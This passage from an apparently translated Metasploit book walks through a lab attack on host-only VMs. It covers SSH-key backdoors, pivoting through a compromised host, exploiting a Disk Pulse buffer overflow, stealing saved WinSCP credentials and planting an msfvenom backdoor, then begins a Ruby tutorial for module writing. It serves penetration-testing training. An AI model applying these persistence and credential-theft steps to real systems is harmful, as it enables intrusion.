![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c73702f9-e219-49b8-a9c5-7ecb0a545702.png)

我们可以看到我们从目标系统获得了第三个 Meterpreter。但是，UID，也就是用户 ID，是`0`，表示 root 用户。因此，这个 Meterpreter 正在以 root 权限运行，并且可以为我们提供对整个系统的无限制访问。让我们使用`session -i`命令与会话标识符交互，这种情况下是`3`：

（图片）

我们可以通过`getuid`命令确认 root 身份，如前面的截图所示。我们现在拥有了系统的完全权限，接下来呢？

# 使用 Metasploit 保持访问

保持对目标系统的访问是一个理想的功能，特别是在执法机构或红队测试目标上部署的防御时。我们可以通过 Metasploit 在 Linux 服务器上使用`post/linux/manage`目录中的`sshkey_persistence`模块实现持久性。该模块添加了我们的 SSH 密钥或创建一个新的密钥，并将其添加到目标服务器上存在的所有用户。因此，下次我们想登录到服务器时，它将不会要求我们输入密码，而只会使用密钥让我们进入。让我们看看我们如何实现这一点：

（图片）

我们只需要使用`set SESSION`命令设置会话标识符，然后使用具有最高特权级别的会话。因此，我们将使用`3`作为`SESSION`标识符，并直接运行模块，如下所示：

（图片）

我们可以看到该模块创建了一个新的 SSH 密钥，然后将其添加到目标系统上的两个用户，即`root`和`claire`。我们可以通过使用 SSH 连接到目标，使用`root`或用户`claire`，或两者，来验证我们的后门访问，如下所示：

（图片）

太棒了！我们可以看到我们通过使用新创建的 SSH 密钥登录到目标系统，使用了`-i`选项，如前面的屏幕所示。让我们看看我们是否也可以作为用户`claire`登录：

（图片）

是的！我们可以使用两个后门用户登录。

大多数服务器不允许 root 登录。因此，您可以编辑`sshd config`文件，将 root 登录更改为`yes`，并在目标上重新启动 SSH 服务。

尝试只给一个用户后门，比如 root，因为大多数人不会通过 root 登录，因为默认配置禁止了这样做。

# 后渗透和转向

无论我们已经攻陷了什么操作系统，Metasploit 都提供了数十个后渗透侦察模块，可以从受损的机器中收集大量数据。让我们使用其中一个模块：

（图片）

运行`enum_configs`后渗透模块，我们可以看到我们已经收集了目标上存在的所有配置文件。这些配置帮助我们发现密码、密码模式、关于正在运行的服务的信息，以及更多其他信息。另一个很棒的模块是`enum_system`，它收集了与操作系统相关的信息、用户账户、正在运行的服务、正在运行的定时作业、磁盘信息、日志文件等等，如下面的截图所示：

（图片）

在目标上收集了大量详细信息后，是不是该开始报告了呢？还不是。一个优秀的渗透测试人员会获取系统访问权限，获得最高级别的访问权限，并提出他的分析。然而，一个优秀的渗透测试人员会做同样的事情，但永远不会停留在一个单一的系统上。他们会尽力进入内部网络，并获得更多对网络的访问权限（如果允许的话）。让我们使用一些命令来帮助我们转向内部网络。一个这样的例子是`arp`命令，它列出内部网络中的所有已连接系统：

（图片）

我们可以看到一个单独的网络存在，它在`192.168.116.0`范围内。让我们发出`ifconfig`命令，看看受损主机上是否连接了另一个网络适配器：

（图片）

是的！我们做对了-还有另一个网络适配器（`Interface 3`）连接到一个单独的网络范围。然而，当我们尝试从我们的地址范围对这个网络进行 ping 或扫描时，我们无法做到，因为从我们的 IP 地址无法访问该网络，这意味着我们需要一种可以通过受损主机将数据从我们的系统转发到目标（否则无法访问）范围的机制。我们称这种安排为枢纽。因此，我们将通过我们获得的 Meterpreter 在系统上添加到目标范围的路由，并且范围内的目标系统将把我们的受损主机视为源发起者。让我们通过 Meterpreter 添加到否则无法访问的范围的路由，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/76ecb319-5ce7-49b4-8609-7b04abb2b1f1.png)

使用`post/multi/manage`目录下的`autoroute`后渗透模块，我们需要在`SUBNET`参数中指定目标范围，并将`SESSION`设置为 Meterpreter 的会话标识符，通过该会话数据将被隧道传输。通过运行该模块，我们可以看到已成功添加了到目标范围的路由。让我们运行 Metasploit 的 TCP 端口扫描模块，并分析我们是否可以扫描目标范围内的主机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0d509e82-111c-4eb4-8092-d44d0990316a.png)

我们只需在找到的目标上运行`portscanner`模块，即使用`arp`命令找到的`192.168.116.133`，使用 10 个线程扫描端口 1-10000，如前面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2fe2a452-de7c-44ca-b28f-1ddb07992325.png)

成功！我们可以看到端口`80`是开放的。然而，我们只能通过 Meterpreter 进行访问。我们需要一种机制，可以通过 Web 浏览器运行一些外部工具来浏览端口`80`，以了解更多关于运行在端口`80`上的目标应用程序。Metasploit 提供了一个内置的 socks 代理模块，我们可以运行它，并将流量从我们的外部应用程序路由到目标`192.168.116.133`系统。让我们按照以下方式使用这个模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d5778e6f-b5b5-4155-8487-4cb824c4e999.png)

我们只需要运行位于`辅助/服务器`路径下的`socks4a`模块。它将在本地端口`1080`上设置一个网关，将流量路由到目标系统。在`127.0.0.1:1080`上代理将通过受损主机转发我们的浏览器流量。然而，对于外部工具，我们需要使用`proxychains`并通过将端口设置为`1080`来配置它。`proxychains`的端口可以使用`/etc/proxychains.conf`文件进行配置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/394be665-3461-43d9-9d0c-39e8ed03e26b.png)

接下来的事情就是在浏览器中将该地址设置为代理，或者在所有第三方命令行应用程序（如 Nmap 和 Metasploit）中使用`proxychains`作为前缀。我们可以根据以下截图配置浏览器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e0fde74f-ea23-4108-b716-a6d0fa611279.png)

确保从“无代理”部分中删除`localhost`和`127.0.0.1`。设置代理后，我们只需在端口`80`上浏览 IP 地址，并检查是否可以到达端口`80`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/baf343c3-2a67-4a2b-a2f8-088edac20c3d.png)

不错！我们可以看到应用程序，它说它是 Disk Pulse Enterprise，软件版本 9.9.16，这是一个已知的有漏洞的版本。在 Metasploit 中，我们有很多关于 Disk Pulse 的模块。让我们使用其中一个，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/79066548-c7f4-421a-acb5-d8fcded486f2.png)

是的！我是这个漏洞利用模块的原始作者之一。在利用之前，让我们了解一下这个漏洞。

# 漏洞分析-基于 SEH 的缓冲区溢出

漏洞在 Disk Pulse 9.9.16 的 Web 服务器组件解析`GET`请求时存在。攻击者可以构造恶意的`GET`请求并导致 SEH 帧被覆盖，这将使攻击者完全访问程序的流程。由于 Disk Pulse 以管理员权限运行，攻击者将获得系统的完全访问权限。

让我们利用漏洞并利用系统，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/33dc98f7-0346-46ee-9fc6-32ea46a20045.png)

只需设置`RHOST`和`LPORT`（将允许我们访问目标成功利用的网关端口），我们就可以准备利用系统。我们可以看到，一旦我们运行了利用程序，我们就打开了 Meterpreter 会话`5`，这标志着成功入侵了目标。我们可以使用`sessions -i`命令验证我们的会话列表，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0a818b99-f6b6-44df-b0dd-6fb4f5fba0fc.png)

让我们与会话`5`进行交互，并检查我们拥有的访问级别：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/69d94fb4-025d-4309-bd85-92afad97e95f.png)

发出`getuid`命令，我们可以看到我们已经拥有 Windows 操作系统上的最高特权`NT AUTHORITY SYSTEM`。

有关此漏洞的更多信息，请参阅：[`cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13696`](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13696)。

# 通过入侵密码管理器来利用人为错误

拥有最高级别的特权，让我们进行一些后期利用，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/28ac3198-637b-4948-a8fc-d3b9375feded.png)

在目标系统上查找安装的各种应用程序总是很好，因为其中一些应用程序可能已经将凭据保存到网络的其他部分。枚举已安装应用程序的列表，我们可以看到我们有 WinSCP 5.7，这是一个流行的 SSH 和 SFTP 客户端。Metasploit 可以从 WinSCP 软件中收集保存的凭据。让我们运行`post/windows/gather/credentials/winscp`模块，并检查我们是否在 WinSCP 软件中有一些保存的凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0d77f33a-f2c8-488f-a614-cffc1b2e1412.png)

太棒了！我们在网络中又救回了另一个主机的凭据，即`192.168.116.134`。好消息是保存的凭据是 root 帐户的，所以如果我们访问这个系统，将会拥有最高级别的特权。让我们使用`ssh_login`模块中找到的凭据，如下所示： 

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f5067b71-81c3-4c55-8408-b6d42ed3c69f.png)

由于我们已经知道用户名和密码，让我们为模块设置这些选项，以及目标 IP 地址，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/41815fcf-23e8-4ff9-b7f7-5b97993badf3.png)

太棒了！这是一个成功的登录，Metasploit 已经自动在其上获得了系统 shell。但是，我们总是可以使用 Meterpreter shell 升级到更好的访问质量。让我们使用`msfvenom`创建另一个后门，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/18dfd8cf-23e7-4804-a155-62ba7d008754.png)

后门将在端口`1337`上监听连接。然而，我们如何将这个后门传输到被入侵的主机上呢？记住，我们运行了 socks 代理辅助模块并对配置进行了更改？在大多数工具的后缀中使用`proxychains`关键字将强制工具通过`proxychains`进行路由。因此，为了传输这样一个文件，我们可以使用如下截图所示的`scp`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5901e805-d31f-4ac6-a397-9a1761e419e5.png)

我们可以看到我们已成功传输了文件。运行匹配处理程序，类似于我们为第一个系统所做的，我们将从目标处获得连接。让我们总览一下我们在这个练习中获得的所有目标和会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c78c60d9-bf26-4f1d-a7e2-66977bb14529.png)

在这个实践的真实世界示例中，我们通过本地漏洞、人为错误和利用以最高特权运行的软件，成功入侵了三个系统，并获得了最高可能的特权。

# 重新审视案例研究

为了设置测试环境，我们将需要多个操作系统，主要是两个不同的主机专用网络。此外，我们还需要以下组件：

| **组件名称** | **类型** | **使用的版本** | **网络详细信息** | **网络类型** |
| --- | --- | --- | --- | --- |
| Kali Linux VM Image | 操作系统 | Kali Rolling（2017.3）x64 | `192.168.174.128`（Vmnet8） | 仅主机 |
| Ubuntu 14.04 LTS | 操作系统 | 14.04（trusty） | `192.168.174.132`（Vmnet8）192.168.116.129（Vmnet6） | 仅主机仅主机 |
| Windows 7 | 操作系统 | 专业版 | 192.168.116.133（Vmnet6） | 仅主机 |
| Ubuntu 16.04 LTS | 操作系统 | 16.04.3 LTS（xenial） | 192.168.116.134（Vmnet6） | 仅主机 |
| PhpCollab | Web 应用程序 | 2.5.1 |  |  |
| Disk Pulse | 企业磁盘管理软件 | 9.9.16 |  |  |
| WinSCP | SSH 和 SFTP | 5.7 |  |  |

# 修改方法

在这个练习中，我们执行了以下关键步骤：

1.  我们首先对目标 IP 地址`192.168.174.132`进行了 Nmap 扫描。

1.  Nmap 扫描显示`192.168.174.132`的端口`80`是开放的。

1.  接下来，我们对运行在端口`80`上的应用程序进行了指纹识别，发现正在运行 Apache 2.4.7。

1.  我们尝试浏览 HTTP 端口。但是，我们什么也没找到。

1.  我们运行了`dir_scanner`模块，在 Apache 服务器上执行基于字典的检查，并找到了 PhpCollab 应用程序目录。

1.  我们使用`searchsploit`找到了 PhpCollab 的一个利用模块，并不得不将第三方利用程序导入 Metasploit。

1.  接下来，我们利用应用程序并获得了对目标系统的有限用户访问权限。

1.  为了改进我们的访问机制，我们上传了一个带后门的可执行文件，并实现了对目标更高级别的访问。

1.  为了获得 root 访问权限，我们运行了`suggester`模块的漏洞利用程序，并发现 overlayfs 特权升级漏洞利用程序将帮助我们实现对目标的 root 访问权限。

1.  我们从[`exploit-db.com/`](https://exploit-db.com/)下载了 overlayfs 漏洞利用程序，编译并运行它以获得对目标的 root 访问权限。

1.  使用相同的先前生成的后门，我们打开了另一个 Meterpreter shell，但这次是以 root 权限。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6a6c2021-a9ff-4bef-9171-439caa2406d6.png)

1.  我们使用 Metasploit 中的`sshkey_persistence`模块向系统添加了持久性。

1.  在目标上运行`arp`命令，我们发现与主机有一个单独的网络连接，该主机位于`192.168.116.0/24`的目标范围内。

1.  我们使用 autoroute 脚本向该网络添加了一条路由。

1.  我们使用 Metasploit 中的 TCP 端口扫描模块从`arp`命令中扫描系统。

1.  我们发现系统的端口`80`是开放的。

1.  由于我们只能通过 Meterpreter 访问目标网络，我们使用 Metasploit 中的`socks4a`模块，使其他工具通过 Meterpreter 连接到目标。

1.  运行 socks 代理，我们配置浏览器使用端口`1080`上的`socks4a`代理。

1.  我们通过浏览器打开了`192.168.116.133`，发现它正在运行 Disk Pulse 9.9.16 web 服务器服务。

1.  我们在 Metasploit 中搜索 Disk Pulse，并发现它容易受到基于 SEH 的缓冲区溢出漏洞的影响。

1.  我们利用了漏洞，并获得了对目标的最高特权访问，因为该软件以 SYSTEM 级别特权运行。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ccc25419-60b6-483d-9b80-88c9ddc63cc0.png)

1.  我们列举了已安装应用程序的列表，并发现系统上安装了 WinSCP 5.7。

1.  我们发现 Metasploit 包含一个内置模块，用于从 WinSCP 中获取保存的凭据。

1.  我们从 WinSCP 收集了 root 凭据，并使用`ssh_login`模块在目标上获得了 root shell。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8ba576f4-f836-41cf-b47e-cbea6a91003d.png)

1.  我们上传了另一个后门，以在目标上获得具有 root 权限的 Meterpreter shell。

# 总结和练习

在本章中，我们介绍了渗透测试涉及的各个阶段。我们还看到了如何设置 Metasploit 并在网络上进行渗透测试。我们还回顾了 Metasploit 的基本功能。我们还研究了在 Metasploit 中使用数据库的好处以及使用 Metasploit 进行内部系统的枢纽转移。

完成本章后，我们掌握了以下内容：

+   了解渗透测试的各个阶段

+   使用 Metasploit 中的数据库的好处

+   Metasploit 框架的基础知识

+   了解利用和辅助模块的工作原理

+   了解如何转向内部网络并配置路由

+   理解使用 Metasploit 进行渗透测试的方法

本章的主要目标是让您熟悉渗透测试阶段和 Metasploit 的基础知识。本章完全侧重于为接下来的章节做准备。

为了充分利用本章所学的知识，您应该进行以下练习：

+   参考 PTES 标准，深入了解面向业务的渗透测试的所有阶段

+   在 Metasploit 框架中使用 overlayfs 特权提升模块

+   找到至少三种不属于 Metasploit 框架的不同利用，并将它们加载到 Metasploit 中

+   在 Windows 7 系统上执行后渗透，并识别五个最佳的后渗透模块

+   通过找到正确的持久性机制在 Windows 7 上实现持久性，并在此过程中检查是否有任何杀毒软件引发警报

+   识别 Windows、Linux 和 Mac 操作系统的至少三种持久性方法

在下一章中，我们将深入探讨脚本编写和构建 Metasploit 模块的广阔世界。我们将学习如何使用 Metasploit 构建尖端模块，并了解一些最流行的扫描和认证测试脚本的工作原理。


# 第十二章：重新发明 Metasploit

我们已经介绍了 Metasploit 的基础知识，现在我们可以进一步了解 Metasploit 框架的底层编码部分。我们将从 Ruby 编程的基础知识开始，以了解各种语法和语义。本章将使您更容易编写 Metasploit 模块。在本章中，我们将看到如何设计和制作各种具有我们选择功能的 Metasploit 模块。我们还将看看如何创建自定义后渗透模块，这将帮助我们更好地控制被利用的机器。

考虑一个情景，渗透测试范围内的系统数量庞大，我们渴望一个后渗透功能，比如从所有被利用的系统中下载特定文件。手动从每个系统下载特定文件不仅耗时，而且低效。因此，在这种情况下，我们可以创建一个自定义后渗透脚本，它将自动从所有被攻陷的系统中下载文件。

本章以 Metasploit 上下文中的 Ruby 编程的基础知识开始，并以开发各种 Metasploit 模块结束。在本章中，我们将涵盖：

+   在 Metasploit 的上下文中了解 Ruby 编程的基础知识

+   探索 Metasploit 中的模块

+   编写自定义扫描器、暴力破解和后渗透模块

+   编写 Meterpreter 脚本

+   了解 Metasploit 模块的语法和语义

+   使用 DLLs 通过**RailGun**执行不可能的任务

现在，让我们了解 Ruby 编程的基础知识，并收集我们编写 Metasploit 模块所需的必要要素。

在深入编写 Metasploit 模块之前，我们必须了解 Ruby 编程的核心功能，这些功能是设计这些模块所需的。为什么我们需要 Ruby 来开发 Metasploit？以下关键点将帮助我们理解这个问题的答案：

+   构建可重用代码的自动化类是 Ruby 语言的一个特性，符合 Metasploit 的需求

+   Ruby 是一种面向对象的编程风格

+   Ruby 是一种基于解释器的语言，速度快，减少开发时间

# Ruby - Metasploit 的核心

Ruby 确实是 Metasploit 框架的核心。但是，Ruby 到底是什么？根据官方网站，Ruby 是一种简单而强大的编程语言，由松本行弘于 1995 年设计。它进一步被定义为一种动态、反射和通用的面向对象的编程语言，具有类似 Perl 的功能。

您可以从以下网址下载 Windows/Linux 的 Ruby：[`rubyinstaller.org/downloads/`](https://rubyinstaller.org/downloads/)。

您可以在以下网址找到一个学习 Ruby 实践的优秀资源：[`tryruby.org/levels/1/challenges/0`](http://tryruby.org/levels/1/challenges/0)。

# 创建您的第一个 Ruby 程序

Ruby 是一种易于学习的编程语言。现在，让我们从 Ruby 的基础知识开始。请记住，Ruby 是一种广泛的编程语言，覆盖 Ruby 的所有功能将超出本书的范围。因此，我们只会坚持设计 Metasploit 模块所需的基本要素。

# 与 Ruby shell 交互

Ruby 提供了一个交互式 shell，与之一起工作将帮助我们了解基础知识。所以，让我们开始吧。打开 CMD/Terminal 并键入`irb`以启动 Ruby 交互式 shell。

让我们在 Ruby shell 中输入一些内容，看看会发生什么；假设我输入数字`2`，如下所示：

```
irb(main):001:0> 2
=> 2   
```

shell 只是返回值。让我们再输入一些内容，比如带有加法运算符的内容，如下所示：

```
irb(main):002:0> 2+3
=> 5  
```

我们可以看到，如果我们以表达式的形式输入数字，shell 会返回表达式的结果。

让我们对字符串执行一些功能，例如将字符串的值存储在变量中，如下所示：

```
irb(main):005:0> a= "nipun"
=> "nipun"
irb(main):006:0> b= "loves Metasploit"
=> "loves metasploit"  
```

在为变量`a`和`b`分配值之后，让我们看看当我们在控制台上输入`a`和`a+b`时会发生什么：

```
irb(main):014:0> a
=> "nipun"
irb(main):015:0> a+b
=> "nipun loves metasploit"  
```

我们可以看到当我们输入`a`时，它反映了存储在名为`a`的变量中的值。同样，`a+b`给了我们连接的`a`和`b`。

# 在 shell 中定义方法

方法或函数是一组语句，当我们调用它时将执行。我们可以在 Ruby 的交互式 shell 中轻松声明方法，也可以使用脚本声明方法。在处理 Metasploit 模块时，了解方法是很重要的。让我们看看语法：

```
def method_name [( [arg [= default]]...[, * arg [, &expr ]])]
expr
end  
```

要定义一个方法，我们使用`def`后跟方法名，括号中包含参数和表达式。我们还使用`end`语句，跟随所有表达式以设置方法定义的结束。在这里，`arg`指的是方法接收的参数。此外，`expr`指的是方法接收或计算的表达式。让我们看一个例子：

```
irb(main):002:0> def xorops(a,b)
irb(main):003:1> res = a ^ b
irb(main):004:1> return res
irb(main):005:1> end
=> :xorops  
```

我们定义了一个名为`xorops`的方法，它接收名为`a`和`b`的两个参数。此外，我们对接收的参数进行了异或操作，并将结果存储在一个名为`res`的新变量中。最后，我们使用`return`语句返回结果：

```
irb(main):006:0> xorops(90,147)
=> 201  
```

我们可以看到我们的函数通过执行异或操作打印出了正确的值。Ruby 提供了两种不同的函数来打印输出：`puts`和`print`。当涉及到 Metasploit 框架时，主要使用`print_line`函数。然而，可以使用`print_good`、`print_status`和`print_error`语句来表示成功、状态和错误。让我们看一些例子：

```
print_good("Example of Print Good") 
print_status("Example of Print Status") 
print_error("Example of Print Error") 
```

这些`print`方法在与 Metasploit 模块一起使用时，将产生以下输出：绿色的`+`符号表示良好，蓝色的`*`表示状态消息，红色的`-`表示错误：

```
[+] Example of Print Good
[*] Example of Print Status
[-] Example of Print Error  
```

我们将在本章的后半部分看到各种`print`语句类型的工作方式。

# Ruby 中的变量和数据类型

变量是一个可以随时更改值的占位符。在 Ruby 中，我们只在需要时声明变量。Ruby 支持许多变量数据类型，但我们只讨论与 Metasploit 相关的类型。让我们看看它们是什么。

# 处理字符串

字符串是表示字符流或序列的对象。在 Ruby 中，我们可以轻松地将字符串值赋给变量，就像在前面的例子中看到的那样。只需在引号或单引号中定义值，我们就可以将值赋给字符串。

建议使用双引号，因为如果使用单引号，可能会出现问题。让我们看看可能出现的问题：

```
irb(main):005:0> name = 'Msf Book'
=> "Msf Book"
irb(main):006:0> name = 'Msf's Book'
irb(main):007:0' '  
```

我们可以看到当我们使用单引号时，它可以正常工作。然而，当我们尝试将`Msf's`替换为值`Msf`时，出现了错误。这是因为它将`Msf's`字符串中的单引号解释为单引号的结束，这并不是事实；这种情况导致了基于语法的错误。

# 连接字符串

在处理 Metasploit 模块时，我们将需要字符串连接功能。我们将有多个实例需要将两个不同的结果连接成一个字符串。我们可以使用`+`运算符执行字符串连接。但是，我们可以使用`<<`运算符向变量附加数据来延长变量：

```
irb(main):007:0> a = "Nipun" 
=> "Nipun" 
irb(main):008:0> a << " loves" 
=> "Nipun loves" 
irb(main):009:0> a << " Metasploit" 
=> "Nipun loves Metasploit" 
irb(main):010:0> a
=> "Nipun loves Metasploit" 
irb(main):011:0> b = " and plays counter strike" 
=> " and plays counter strike" 
irb(main):012:0> a+b 
=> "Nipun loves Metasploit and plays counter strike"  
```

我们可以看到，我们首先将值`"Nipun"`赋给变量`a`，然后使用`<<`运算符将`"loves"`和`"Metasploit"`附加到它上。我们可以看到我们使用了另一个变量`b`，并将值`"and plays counter strike"`存储在其中。接下来，我们简单地使用+运算符连接了这两个值，并得到了完整的输出`"Nipun loves Metasploit and plays counter strike"`。

# 子字符串函数

在 Ruby 中找到字符串的子字符串非常容易。我们只需要在字符串中指定起始索引和长度，如下例所示：

```
irb(main):001:0> a= "12345678"
=> "12345678"
irb(main):002:0> a[0,2]
=> "12"
irb(main):003:0> a[2,2]
=> "34"  
```

# 拆分函数

我们可以使用`split`函数将字符串的值拆分为变量数组。让我们看一个快速示例来演示这一点：

```
irb(main):001:0> a = "mastering,metasploit"
=> "mastering,metasploit"
irb(main):002:0> b = a.split(",")
=> ["mastering", "metasploit"]
irb(main):003:0> b[0]
=> "mastering"
irb(main):004:0> b[1]
=> "metasploit"  
```

我们可以看到，我们已经将字符串的值从`","`位置拆分为一个新数组`b`。现在，包含值`"mastering"`和`"metasploit"`的`"mastering,metasploit"`字符串分别形成数组`b`的第 0 和第 1 个元素。

# Ruby 中的数字和转换

我们可以直接在算术运算中使用数字。但是，在处理用户输入时，记得使用`.to_i`函数将字符串转换为整数。另一方面，我们可以使用`.to_s`函数将整数转换为字符串。

让我们看一些快速示例及其输出：

```
irb(main):006:0> b="55"
=> "55"
irb(main):007:0> b+10
TypeError: no implicit conversion of Fixnum into String
        from (irb):7:in `+'
        from (irb):7
        from C:/Ruby200/bin/irb:12:in `<main>'
irb(main):008:0> b.to_i+10
=> 65
irb(main):009:0> a=10
=> 10
irb(main):010:0> b="hello"
=> "hello"
irb(main):011:0> a+b
TypeError: String can't be coerced into Fixnum
        from (irb):11:in `+'
        from (irb):11
        from C:/Ruby200/bin/irb:12:in `<main>'
irb(main):012:0> a.to_s+b
=> "10hello"  
```

我们可以看到，当我们将`a`的值赋给带引号的`b`时，它被视为字符串，并且在执行加法操作时生成了错误。然而，一旦使用`to_i`函数，它将值从字符串转换为整数变量，并且加法操作成功执行。同样，关于字符串，当我们尝试将整数与字符串连接时，会出现错误。但是，在转换后，它可以正常工作。

# Ruby 中的转换

在处理漏洞利用和模块时，我们将需要大量的转换操作。让我们看看我们将在接下来的部分中使用的一些转换：

+   **十六进制转十进制转换**：

+   在 Ruby 中，使用内置的`hex`函数很容易将值从十六进制转换为十进制。让我们来看一个例子：

```
irb(main):021:0> a= "10"
=> "10"
irb(main):022:0> a.hex
=> 16
```

+   +   我们可以看到，对于十六进制值`10`，我们得到了值`16`。

+   **十进制转十六进制转换**：

+   前面函数的相反操作可以使用`to_s`函数执行，如下所示：

```
irb(main):028:0> 16.to_s(16)
=> "10"
```

# Ruby 中的范围

范围是重要的方面，在 Metasploit 等辅助模块中广泛使用扫描仪和模糊测试器。

让我们定义一个范围，并查看我们可以对这种数据类型执行的各种操作：

```
irb(main):028:0> zero_to_nine= 0..9
=> 0..9
irb(main):031:0> zero_to_nine.include?(4)
=> true
irb(main):032:0> zero_to_nine.include?(11)
=> false
irb(main):002:0> zero_to_nine.each{|zero_to_nine| print(zero_to_nine)}
0123456789=> 0..9
irb(main):003:0> zero_to_nine.min
=> 0
irb(main):004:0> zero_to_nine.max
=> 9
```

我们可以看到，范围提供了各种操作，如搜索、查找最小和最大值以及显示范围内的所有数据。在这里，`include?`函数检查值是否包含在范围内。此外，`min`和`max`函数显示范围内的最低和最高值。

# Ruby 中的数组

我们可以简单地将数组定义为各种值的列表。让我们看一个例子：

```
irb(main):005:0> name = ["nipun","metasploit"]
=> ["nipun", "metasploit"]
irb(main):006:0> name[0]
=> "nipun"
irb(main):007:0> name[1]
=> "metasploit"  
```

到目前为止，我们已经涵盖了编写 Metasploit 模块所需的所有变量和数据类型。

有关变量和数据类型的更多信息，请参阅以下链接：[`www.tutorialspoint.com/ruby/index.htm`](https://www.tutorialspoint.com/ruby/index.htm)。

请参考以下链接，了解如何有效使用 Ruby 编程的快速备忘单：[`github.com/savini/cheatsheets/raw/master/ruby/RubyCheat.pdf`](https://github.com/savini/cheatsheets/raw/master/ruby/RubyCheat.pdf)。

从其他编程语言转换到 Ruby？请参考一个有用的指南：[`hyperpolyglot.org/scripting`](http://hyperpolyglot.org/scripting)。

# Ruby 中的方法

方法是函数的另一个名称。与 Ruby 不同背景的程序员可能会互换使用这些术语。方法是执行特定操作的子例程。使用方法实现代码的重用，并显著减少程序的长度。定义方法很容易，它们的定义以`def`关键字开始，并以`end`语句结束。让我们考虑一个简单的程序，以了解它们的工作原理，例如，打印出`50`的平方：

```
def print_data(par1) 
square = par1*par1 
return square 
end 
answer = print_data(50) 
print(answer)  
```

`print_data`方法接收从主函数发送的参数，将其与自身相乘，并使用`return`语句发送回去。程序将这个返回值保存在一个名为`answer`的变量中，并打印这个值。在本章的后半部分以及接下来的几章中，我们将大量使用方法。

# 决策运算符

决策也是一个简单的概念，与任何其他编程语言一样。让我们看一个例子：

```
irb(main):001:0> 1 > 2
=> false  
```

让我们也考虑字符串数据的情况：

```
irb(main):005:0> "Nipun" == "nipun"
=> false
irb(main):006:0> "Nipun" == "Nipun"
=> true  
```

让我们考虑一个带有决策运算符的简单程序：

```
def find_match(a) 
if a =~ /Metasploit/ 
return true 
else 
return false 
end 
end 
# Main Starts Here 
a = "1238924983Metasploitduidisdid" 
bool_b=find_match(a) 
print bool_b.to_s 
```

在上面的程序中，我们使用了单词`"Metasploit"`，它位于垃圾数据的中间，并赋值给变量`a`。接下来，我们将这些数据发送到`find_match()`方法，它匹配`/Metasploit/`正则表达式。如果变量`a`包含单词`"Metasploit"`，则返回 true 条件，否则将 false 值赋给变量`bool_b`。

运行上述方法将基于决策运算符`=~`产生一个有效条件，匹配两个值。

在 Windows 环境中执行上述程序的输出将与以下输出类似：

```
C:\Ruby23-x64\bin>ruby.exe a.rb
true
```

# Ruby 中的循环

迭代语句被称为循环；与任何其他编程语言一样，Ruby 编程中也存在循环。让我们使用它们，并看看它们的语法与其他语言有何不同：

```
def forl(a) 
for i in 0..a 
print("Number #{i}n") 
end 
end 
forl(10) 
```

上面的代码从`0`到`10`迭代循环，如范围中定义的那样，并打印出值。在这里，我们使用`#{i}`在`print`语句中打印`i`变量的值。`n`关键字指定了一个新行。因此，每次打印一个变量，它都会占据一行新行。

通过`each`循环迭代循环也是一种常见的做法，在 Metasploit 模块中被广泛使用。让我们看一个例子：

```
def each_example(a) 
a.each do |i| 
print i.to_s + "t" 
end 
end 
# Main Starts Here 
a = Array.new(5) 
a=[10,20,30,40,50] 
each_example(a) 
```

在上面的代码中，我们定义了一个接受数组`a`的方法，并使用`each`循环打印出所有的元素。使用`each`方法进行循环将把`a`数组的元素临时存储在`i`中，直到在下一个循环中被覆盖。`t`在`print`语句中表示一个制表符。

更多关于循环的信息，请参考[`www.tutorialspoint.com/ruby/ruby_loops.htm`](http://www.tutorialspoint.com/ruby/ruby_loops.htm)。

# 正则表达式

正则表达式用于匹配字符串或在给定一组字符串或句子中的出现次数。当涉及到 Metasploit 时，正则表达式的概念至关重要。我们在大多数情况下使用正则表达式，比如编写模糊测试器、扫描器、分析给定端口的响应等。

让我们看一个演示正则表达式用法的程序的例子。

考虑一个情景，我们有一个变量`n`，值为`Hello world`，我们需要为它设计正则表达式。让我们看一下以下代码片段：

```
irb(main):001:0> n = "Hello world"
=> "Hello world"
irb(main):004:0> r = /world/
=> /world/
irb(main):005:0> r.match n
=> #<MatchData "world">
irb(main):006:0> n =~ r
=> 6  
```

